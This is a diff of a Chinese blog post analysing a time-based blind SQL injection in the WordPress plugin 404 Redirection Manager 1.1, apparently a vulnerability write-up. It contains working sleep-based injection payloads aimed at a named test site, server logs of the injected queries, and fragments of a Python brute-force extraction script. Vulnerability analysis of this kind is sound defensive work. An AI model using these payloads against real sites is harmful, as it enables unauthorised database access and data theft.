@@ -1,7 +1,7 @@
 ---
 layout: post
 title: WordPress插件:404 Redirection Manager 1.1 SQL注入
-categories: [漏洞分析]
+categories: [Vulnerability analysis]
 tags: [WordPress,SQL Injection]
 fullview: false
 comments: true
@@ -22,22 +22,22 @@ comments: true
 
 首先看下前面提到1.0版本的poc：
 
-<pre><code>monburan-monburan-wordpress.daoapp.io/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL</code></pre>
+    monburan-monburan-wordpress.daoapp.io/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL
 
 ‘字面上’的注入很好理解，利用<code>sleep()</code>进行延时注入，当<code>'a'='a'</code>结果为<code>True</code>，则取0，<code>5-0=5</code>，执行<code>sleep(5)</code>。
 
 我觉得还可以精简一下:
 
-<pre><code>monburan-monburan-wordpress.daoapp.io/?p=5')AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL</code></pre>
+    monburan-monburan-wordpress.daoapp.io/?p=5')AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL
 
 为了更好的分析这个漏洞产生的过程，我插入了一条可以触发数据库错误的语句
 <code>') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'</code>（这里多了一个<code>'</code>）。
 
 借助后台日志，我尝试着找到了这段注入执行的语句。
 
-<pre><code> [Sat Dec 24 14:42:56.429172 2016] [:error] [pid 166] [client 10.10.73.77:1174] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and (redirect_from='/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'' or redirect_from='/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' ) \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82</code></pre>
+    [Sat Dec 24 14:42:56.429172 2016] [:error] [pid 166] [client 10.10.73.77:1174] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and (redirect_from='/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'' or redirect_from='/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' ) \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
 
-<pre><code>[Sat Dec 24 14:42:56.430187 2016] [:error] [pid 166] [client 10.10.73.77:1174] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'' regexp regex or '/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82</code></pre>
+    [Sat Dec 24 14:42:56.430187 2016] [:error] [pid 166] [client 10.10.73.77:1174] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'' regexp regex or '/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
 
 有了这些，就可以方便在源码中发现问题所在，下面是引入注入的代码：
 
@@ -65,9 +65,9 @@ $wpdb是WordPress 数据库访问抽象对象，get_row()是WordPress中一个�
 
 以上，代码中的问题看完，现在整理出完整在数据库中执行的语句：
 
-<pre><code>select * from wordpress_db.wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc</code></pre>
+     select * from wordpress_db.wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc
 
-<pre><code>select * from wordpress_db.wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and ('/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc</code></pre>
+     select * from wordpress_db.wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and ('/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc
 
 可以发现，这里<code>sleep</code>执行了两次，所以一条SQL执行的时间应该在10秒以上。
 
@@ -79,9 +79,7 @@ $wpdb是WordPress 数据库访问抽象对象，get_row()是WordPress中一个�
 
 在确认这个漏洞后第一时间想到的是如何利用，这种基于时间的盲注通常是用爆破的方式获取数据。然后就写了个脚本跑一下(仅测试数据库名和用户名)。
 
-<pre>
-<code>
-# -*- coding:utf-8 -*-
+<pre><code># -*- coding:utf-8 -*-
 import requests
 import urllib
 import string
@@ -203,9 +201,4 @@ if __name__ == '__main__':
     print main.__doc__
     main()
 
-</code>
-</pre>
-
-
-
-
+</code></pre>
